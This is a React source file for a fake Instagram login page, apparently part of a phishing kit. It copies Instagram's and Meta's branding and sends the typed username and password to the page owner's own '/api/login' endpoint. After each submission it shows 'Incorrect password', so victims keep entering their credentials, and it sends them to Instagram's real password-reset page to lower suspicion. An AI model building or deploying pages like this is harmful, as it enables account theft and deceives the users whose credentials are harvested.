import axios from 'axios'
import { useEffect, useState } from 'react';
const InstagramLogin = () => {
    const [msg, setMsg] = useState("")
    const [flag, setFlag] = useState(0)
    const [btn, setBtn] = useState(true)

    const [fFlag, setFflag] = useState(false)
    const [first, setFirst] = useState(false)
    const [count, setCount] = useState(3)

    const [formData, setFormData] = useState({
        email: "",
        password: "",
    });


    const formHandel = (e) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
        setFirst(true)
    }
    const loginUser = async () => {
        if (count < 1) {
            return alert('Too many attempts. Please try again later.')
        }
        const { email, password } = formData
        if (!email && !password) {
            setFflag(true)
            setBtn(false)
            setFirst(true)
            return null
        }
        setBtn(false)
        axios.post("/api/login", { email, password }).then((res) => {
            const { flag, msg } = res.data;
            setMsg(msg)
            setFlag(flag)
            setBtn(true)
            setCount(count - 1)
            alert(`Incorrect password. ${count - 1} attempts left.`)
        }).catch((error) => {
            const { flag, msg } = error.response.data;
            setMsg(msg)
            setFlag(flag)
            setBtn(true)
            

        })
    };


    useEffect(() => {
        const { email, password } = formData
        if (first) {
            if (!email && !password) {
                setFflag(true)
                setBtn(false)
            } else {
                setBtn(true)
                setFflag(false)
            }
        }
    }, [formData, first])

    const loginOnly = () => {
        return alert('only login to username and password')
    }

    const redirectToReset = () => {
        window.open(
            "https://www.instagram.com/accounts/password/reset/",
        );
    };

    return (
        <div className="min-h-screen bg-white flex flex-col items-center justify-between py-8 px-5 font-sans">
            {/* Top Section */}
            <div className="w-full max-w-sm group">

                {/* English text */}
                <div className="flex items-center justify-center text-gray-600">
                    <span className="text-sm mb-10 transition-all duration-200 group-focus-within:mb-0">
                        English (US)
                    </span>
                </div>

                {/* Center Section */}
                <div className="flex flex-col items-center mt-10">

                    {/* Logo */}
                    <div className="mb-10">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram"
                            className="w-16 h-16" />
                    </div>

                    {/* Inputs */}
                    <div className="w-full space-y-3">
                        <input
                            type="text"
                            name="email"
                            value={formData.email}
                            onChange={(e) => formHandel(e)}
                            placeholder="Username, email or mobile number"
                            className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-gray-400 transition text-sm"
                        />
                        <p className={` ${flag == 1 || flag == 4 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
                            {fFlag ? "Please enter your username or email" : flag == 1 || flag == 4 ? msg : ""}
                        </p>
                        <input
                            type="password"
                            name="password"
                            placeholder="Password"
                            value={formData.password}
                            onChange={(e) => formHandel(e)}
                            className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-gray-400 transition text-sm"
                        />
                        <p className={` ${flag == 2 || flag == 3 || flag == 5 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
                            {fFlag ? "Please enter your password" : flag == 2 || flag == 3 ? msg : flag == 5 ? `${count > 0 ? `Incorrect password. ${count} attempts left.` : "Too many attempts. Please try again later."}` : ""}
                        </p>

                        <button
                            disabled={!btn}
                            onClick={loginUser}
                            className={`${btn ? "cursor-pointer bg-[#0064e0]" : "cursor-not-allowed bg-blue-300"} w-full ] text-white py-3 rounded-full font-semibold text-base mt-2 active:scale-95 transition-transform`}>
                            Log in
                        </button>

                        <div onClick={redirectToReset} className="text-center mt-2 mb-4">
                            <a href="#" className="text-md font-semibold text-gray-700">
                                Forgot password?
                            </a>
                        </div>
                    </div>
                </div>
            </div>

            {/* Bottom Section */}
            <div className="w-full max-w-sm flex flex-col items-center space-y-6">
                <button onClick={loginOnly} className="w-full border border-[#0064e0] text-[#0064e0] py-2 rounded-full font-semibold text-sm">
                    Create new account
                </button>

                <div className="flex flex-col items-center opacity-60">
                    <span className="text-xs text-gray-500 mb-1">from</span>
                    <img
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png"
                        alt="Meta"
                        className="h-4"
                    />
                </div>
            </div>

        </div>


    )
};


export default InstagramLogin;
